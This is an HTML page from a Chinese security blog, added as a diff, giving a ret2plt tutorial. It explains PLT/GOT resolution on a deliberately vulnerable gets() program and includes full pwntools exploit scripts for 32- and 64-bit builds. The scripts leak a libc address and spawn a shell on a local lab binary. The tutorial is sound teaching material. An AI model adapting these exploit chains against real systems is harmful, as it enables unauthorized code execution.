@@ -1,0 +1,968 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+
+    <title>ret2plt | 诚安</title>
+    <meta property="og:title" content="ret2plt - 诚安">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2021-05-04T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2021-05-04T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="信息安全、主机安全、网络安全、二进制、数据安全">
+    <meta name="description" content="ret2plt">
+        
+    <meta name="author" content="winsun">
+    <meta property="og:url" content="https://winsun.github.io/fightsec/post/pwn_05_ret2plt/">
+    <link rel="shortcut icon" href='/fightsec/favicon.ico'  type="image/x-icon">
+
+    <link rel="stylesheet" href='/fightsec/css/normalize.css'>
+    <link rel="stylesheet" href='/fightsec/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+        <link rel="stylesheet" href='/fightsec/css/douban.css'>
+    
+        <link rel="stylesheet" href='/fightsec/css/other.css'>
+    
+</head>
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://winsun.github.io/fightsec/">
+                        诚安
+                    </a>
+                
+                <p class="description">专注信息安全和机器学习</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://winsun.github.io/fightsec/">首页</a>
+                    
+                    <a  href="https://winsun.github.io/fightsec/tools/" title="工具">工具</a>
+                    
+                    <a  href="https://winsun.github.io/fightsec/archives/" title="归档">归档</a>
+                    
+                    <a  href="https://winsun.github.io/fightsec/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+         
+         
+        background-color: #dfb317;
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#plt分析">plt分析</a></li>
+    <li><a href="#ret2plt利用">ret2plt利用</a>
+      <ul>
+        <li><a href="#泄漏libc基地址">泄漏libc基地址</a></li>
+        <li><a href="#获取shell">获取shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if (leftPos < 220) {
+                postToc.css({ "width": leftPos - 10, "margin-left": (0 - leftPos) })
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+
+        if ($("#TableOfContents").children().length < 1) {
+            $(".post-toc").remove();
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">ret2plt</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2021年5月4日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='/fightsec/categories/pwn'>pwn</a></span>
+            
+        </div>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <p>PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)</p>
+<h1 id="漏洞程序">漏洞程序</h1>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+
+void vuln() {
+    puts(&quot;Come get me&quot;);
+
+    char buffer[20];
+    gets(buffer);
+}
+
+int main() {
+    vuln();
+    return 0;
+}
+</code></pre><h1 id="32位ret2plt">32位ret2plt</h1>
+<h2 id="plt分析">plt分析</h2>
+<ol>
+<li>程序保护
+//gcc source.c -o vuln-32 -no-pie -fno-stack-protector -z execstack -m32</li>
+</ol>
+<pre tabindex="0"><code>└─$ checksec --file=./vuln-32
+[*] '/home/kali/exploits/ret2plt/vuln-32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><ol start="2">
+<li>plt节</li>
+</ol>
+<ul>
+<li>.plt节可执行</li>
+</ul>
+<pre tabindex="0"><code>[0xf7fe4450]&gt; iS~.plt
+10  0x000002f0   0x18 0x080482f0   0x18 -r-- .rel.plt
+12  0x00001020   0x40 0x08049020   0x40 -r-x .plt
+22  0x00003000   0x18 0x0804c000   0x18 -rw- .got.plt
+</code></pre><ul>
+<li>查看plt节</li>
+</ul>
+<pre tabindex="0"><code>0xf7fe4450]&gt; pdi 9 @ 0x08049020
+0x08049020   sym..plt:
+0x08049020         ff3504c00408  push dword [0x804c004]
+0x08049026         ff2508c00408  jmp dword [0x804c008]
+0x0804902c                 0000  add byte [eax], al
+0x0804902e                 0000  add byte [eax], al
+0x08049030   sym.imp.gets:
+0x08049030         ff250cc00408  jmp dword [reloc.gets]
+0x08049036           6800000000  push 0
+0x0804903b           e9e0ffffff  jmp sym..plt
+0x08049040   sym.imp.puts:
+0x08049040         ff2510c00408  jmp dword [reloc.puts]
+0x08049046           6808000000  push 8
+</code></pre><p>plt中每个entry有3条指令，基本模式jmp [got@xxx],push number , jmp plt@0</p>
+<ul>
+<li>plt与got关系<br>
+plt表</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">plt地址</th>
+<th style="text-align:center">.plt代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">plt_0</td>
+<td style="text-align:center">push &amp;link_map</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">jmp _dl_runtime_resolve</td>
+</tr>
+<tr>
+<td style="text-align:center">plt_1</td>
+<td style="text-align:center">jmp  [got_3]</td>
+</tr>
+<tr>
+<td style="text-align:center">plt_1_1</td>
+<td style="text-align:center">push num</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">jmp plt_0</td>
+</tr>
+</tbody>
+</table>
+<p>got.plt表</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">got地址</th>
+<th style="text-align:center">.got.plt</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">got_0</td>
+<td style="text-align:center">.dynamic地址</td>
+</tr>
+<tr>
+<td style="text-align:center">got_1</td>
+<td style="text-align:center">link_map地址</td>
+</tr>
+<tr>
+<td style="text-align:center">got_2</td>
+<td style="text-align:center">_dl_runtime_resolve</td>
+</tr>
+<tr>
+<td style="text-align:center">got_3</td>
+<td style="text-align:center">plt_1_1 或 puts@libc</td>
+</tr>
+</tbody>
+</table>
+<p>call puts@plt，等同于如下流程：</p>
+<ol>
+<li>jmp got_3</li>
+<li>如果got_3中地址是plt_1_1，即第一次调用，还没有动态解析puts符号地址，那么将执行push num</li>
+<li>jmp plt_0</li>
+<li>_dl_runtime_resolve执行之后，got_3中存放的是符号的绝对地址，比如puts@libc
+之后再调用call puts@plt将直接调用 puts@libc。</li>
+</ol>
+<h2 id="ret2plt利用">ret2plt利用</h2>
+<h3 id="泄漏libc基地址">泄漏libc基地址</h3>
+<ol>
+<li>栈布局
+gets(buffer)可以利用溢出漏洞构建如下栈布局：
+<table>
+<thead>
+<tr>
+<th style="text-align:center">栈偏移</th>
+<th style="text-align:center">栈内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">+x</td>
+<td style="text-align:center">puts@plt</td>
+</tr>
+<tr>
+<td style="text-align:center">+x+4</td>
+<td style="text-align:center">main_addr</td>
+</tr>
+<tr>
+<td style="text-align:center">+x+8</td>
+<td style="text-align:center">puts@got</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ol>
+<p>gets(buffer)返回后，eip == [x]</p>
+<ol start="2">
+<li>获取溢出偏移</li>
+</ol>
+<pre tabindex="0"><code>└─$ ragg2 -P 100 -r                                      
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/ret2plt]
+└─$ r2 -d -A ./vuln-32
+glibc.fc_offset = 0x00148
+[0xf7fe4450]&gt; dc
+Come get me
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
+[+] SIGNAL 11 errno=0 addr=0x41414c41 code=1 si_pid=1094798401 ret=0
+[0x41414c41]&gt; wopO 0x41414c41
+32
+</code></pre><p>x == 32</p>
+<ol start="3">
+<li>计算libc基地址</li>
+</ol>
+<pre tabindex="0"><code>payload = ('A' * x, puts@plt,main_addr,puts@got)
+send(payload)
+puts_leak = recv(4)
+libc.address = puts_leak - libc.sym['puts']
+</code></pre><h3 id="获取shell">获取shell</h3>
+<pre tabindex="0"><code>payload = flat(
+    'A' * 32,
+    libc.sym['system'],
+    libc.sym['exit'],
+    next(libc.search(b'/bin/sh\x00'))
+)
+</code></pre><h1 id="ret2plt-pwn">ret2plt pwn</h1>
+<pre tabindex="0"><code>from pwn import *
+
+elf = context.binary = ELF('./vuln-32')
+libc = elf.libc
+p = process()
+
+p.recvline()
+
+payload = flat(
+    'A' * 32,
+    elf.plt['puts'],
+    elf.sym['main'],
+    elf.got['puts']
+)
+
+p.sendline(payload)
+
+puts_leak = u32(p.recv(4))
+p.recvlines(2)
+
+libc.address = puts_leak - libc.sym['puts']
+log.success(f'LIBC base: {hex(libc.address)}')
+
+payload = flat(
+    'A' * 32,
+    libc.sym['system'],
+    libc.sym['exit'],
+    next(libc.search(b'/bin/sh\x00'))
+)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre><p>pwn结果：</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/ret2plt]
+└─$ python exp32.py
+[*] '/home/kali/exploits/ret2plt/vuln-32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/usr/lib/i386-linux-gnu/libc.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/home/kali/exploits/ret2plt/vuln-32': pid 1955188
+[*] Switching to interactive mode
+Come get me
+$ who
+kali     pts/1        2023-02-10 00:59 (192.168.44.1)
+kali     pts/0        2023-02-09 20:54 (192.168.44.1)
+</code></pre><h1 id="64位ret2plt">64位ret2plt</h1>
+<pre tabindex="0"><code>from pwn import *
+elf = context.binary = ELF('./vuln-64')
+libc = elf.libc
+p = process()
+p.recvline()
+
+# build rop chain for outputing puts address in got
+rop = ROP(elf)
+rop.raw('A' * 40)
+rop.puts(elf.got['puts'])
+rop.raw(elf.sym['main'])
+
+p.sendline(rop.chain())
+
+# libc addresses are often only 6 bytes long, meaning they are preceded with 0x0000
+# but this won't be read as it's a null byte, so only read 6 bytes and append the null ones later
+puts_leak = u64(p.recv(6) + b'\x00\x00')
+p.recvlines(2)
+
+libc.address = puts_leak - libc.sym['puts']
+log.success(f'LIBC base: {hex(libc.address)}')
+
+
+binsh = next(libc.search(b'/bin/sh\x00'))
+
+rop = ROP(libc)
+rop.raw('A' * 40)
+rop.system(binsh)
+rop.raw(libc.sym['exit'])       # not required
+
+p.sendline(rop.chain())
+
+p.interactive() 
+</code></pre><p><strong>注意</strong> elf.got[&lsquo;puts&rsquo;]和libc.sym[&lsquo;puts&rsquo;]的区别</p>
+<p>参考：<br>
+<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT and PLT for pwning</a><br>
+<a href="http://ahageek.com/writer/posts/got-and-plt/index.html">explore got and plt using radare2</a></p>
+
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://winsun.github.io/fightsec/">winsun</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://winsun.github.io/fightsec/post/pwn_05_ret2plt/">https://winsun.github.io/fightsec/post/pwn_05_ret2plt/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/fightsec/post/pwn_03_got_overwrite/">利用got覆盖执行shellcode</a></li>
+        
+        <li><a href="/fightsec/post/pwn_21_overflow01/">缓冲区溢出01-溢出漏洞</a></li>
+        
+        <li><a href="/fightsec/post/pwn_22_overflow02/">缓冲区溢出02-shellcode</a></li>
+        
+        <li><a href="/fightsec/post/linux_03_got_plt/">GOT&amp;PLT</a></li>
+        
+        <li><a href="/fightsec/post/pwn_01_pwntools/">pwntools基本用法</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='/fightsec/tags/pwn'>pwn</a></li>
+                
+                <li><a href='/fightsec/tags/plt'>plt</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "winsun/fightsec"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2023 <a href="https://winsun.github.io/fightsec/">诚安 By winsun</a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/raphael/2.2.8/raphael.min.js" crossorigin="anonymous"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/flowchart/1.12.2/flowchart.min.js" crossorigin="anonymous"></script>
+        <script>(function () {
+                if (!window.flowchart) return;
+                const blocks = document.querySelectorAll('pre code.language-flowchart, pre code.language-flow');
+                for (let i = 0; i < blocks.length; i++) {
+                    const block = blocks[i];
+                    const rootElement = block.parentNode;
+                    const container = document.createElement('div');
+                    const id = `js-flowchart-diagrams-${i}`;
+                    container.id = id;
+                    container.className = 'align-center';
+                    container.setAttribute("style", "overFlow-x:auto");
+                    rootElement.parentNode.replaceChild(container, rootElement);
+                    const diagram = flowchart.parse(block.childNodes[0].nodeValue);
+                    diagram.drawSVG(id, window.flowchartDiagramsOptions ? window.flowchartDiagramsOptions : {});
+                }
+            })();
+        </script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js" crossorigin="anonymous"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/snap.svg/0.5.1/snap.svg-min.js" crossorigin="anonymous"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js" crossorigin="anonymous"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/js-sequence-diagrams/1.0.6/sequence-diagram-min.js" crossorigin="anonymous"></script>
+        <script>(function () {
+            if (!window.Diagram) return;
+            const blocks = document.querySelectorAll('pre code.language-sequence');
+            for (let i = 0; i < blocks.length; i++) {
+                const block = blocks[i];
+                
+                const rootElement = block.parentNode;
+                const container = document.createElement('div');
+                const id = `js-sequence-diag-${i}`;
+                container.id = id;
+                container.className = 'align-center';
+                container.setAttribute("style", "overFlow-x:auto");
+                rootElement.parentNode.replaceChild(container, rootElement);
+
+                const diagram = Diagram.parse(block.childNodes[0].nodeValue);
+                diagram.drawSVG(id, window.sequenceDiagramsOptions
+                    ? window.sequenceDiagramsOptions
+                    : { theme: 'simple' });
+            }
+        })();
+        </script><script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/fightsec/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/fightsec/js/douban.js'></script>
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://winsun.github.io/fightsec/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://winsun.github.io/fightsec/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_09_ret2csu/" title="ret2csu">ret2csu</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/" title="ret2dlresolve">ret2dlresolve</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_19_exp_socket/" title="socket exploitation">socket exploitation</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_06_srop/" title="SROP">SROP</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_02_rop/" title="ROP">ROP</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_11_heap_chunk_bins/" title="heap: chunks and bins">heap: chunks and bins</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/vul_04_springshell/" title="springshell">springshell</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/vul_03_heartblood/" title="heartbleed">heartbleed</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/knl_02_syscall/" title="linux kernel : system call">linux kernel : system call</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/knl_01_process/" title="linux kernel : process">linux kernel : process</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/fightsec/categories/'>分类</a></h3>
+<ul class="widget-list">
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/AI/">AI (9)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/C2/">C2 (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/arm/">arm (20)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/cybersecurity/">cybersecurity (12)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/edr/">edr (2)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/encrypt/">encrypt (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/fuzz/">fuzz (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/golang/">golang (14)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/iot/">iot (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/linux/">linux (15)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/pwn/">pwn (24)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/reverse/">reverse (2)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/web%E5%AE%89%E5%85%A8/">web安全 (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/%E5%8A%A0%E5%9B%BA/">加固 (1)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试 (3)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/%E6%BC%8F%E6%B4%9E/">漏洞 (4)</a></li>
+    
+    <li><a href="https://winsun.github.io/fightsec/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全 (12)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/fightsec/tags/'>标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://winsun.github.io/fightsec/tags/AI/">AI</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/ATTCT/">ATT&amp;CT</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/C2/">C2</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/NX/">NX</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/android/">android</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/aslr/">aslr</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/backdoor/">backdoor</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/bayes/">bayes</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/binwalk/">binwalk</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/canary/">canary</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/context/">context</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/cron/">cron</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/dga/">dga</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/dns/">dns</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/elastic/">elastic</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/elf/">elf</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/encrypt/">encrypt</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/exploit/">exploit</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/for/">for</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/fuzz/">fuzz</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/gateway/">gateway</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/gcc/">gcc</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/gdb/">gdb</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/ghidra/">ghidra</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/golang/">golang</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/gorm/">gorm</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/got/">got</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/heap/">heap</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/honeypot/">honeypot</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/ida/">ida</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/interface/">interface</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/kernel/">kernel</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/logger/">logger</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/matplotlib/">matplotlib</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/nat/">nat</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/numpy/">numpy</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/overflow/">overflow</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/pandas/">pandas</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/pets/">pets</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/pie/">pie</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/plt/">plt</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/process/">process</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/proxy/">proxy</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/pwn/">pwn</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/pwntools/">pwntools</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/recover/">recover</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/reflect/">reflect</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/reverse/">reverse</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/rop/">rop</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/router/">router</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/routine/">routine</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/scanner/">scanner</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/scipy/">scipy</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/shell/">shell</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/shellcode/">shellcode</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/socket/">socket</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/sqlinject/">sqlinject</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/srop/">srop</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/switch/">switch</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/syscall/">syscall</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/system/">system</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/tools/">tools</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/vfs/">vfs</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/vpn/">vpn</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/vuln/">vuln</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/web/">web</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/x86/">x86</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E5%9F%BA%E7%A1%80/">基础</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E5%A0%A1%E5%9E%92%E6%9C%BA/">堡垒机</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/">概率分布</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E6%B7%B7%E6%B7%86%E7%9F%A9%E9%98%B5/">混淆矩阵</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E7%9B%B8%E4%BC%BC%E5%BA%A6/">相似度</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/">虚拟化</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/">负载均衡</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/">随机变量</a>
+    
+    <a href="https://winsun.github.io/fightsec/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/">零信任</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
